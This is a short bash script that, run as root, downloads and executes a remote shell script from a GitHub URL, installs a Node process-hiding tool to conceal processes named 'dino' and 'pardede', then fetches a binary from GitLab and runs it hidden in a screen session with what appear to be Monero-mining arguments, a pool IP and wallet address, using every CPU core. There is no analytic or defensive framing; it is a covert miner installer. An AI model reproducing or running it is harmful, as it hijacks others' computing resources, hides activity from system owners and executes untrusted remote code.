#!/bin/bash
su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm -y
sudo npm i -g node-process-hider && sudo ph add dino
sudo ph add pardede
wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
screen -dms run ./pardede -a rx/0 -o 163.172.153.31:3333  -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
EOF
screen -r
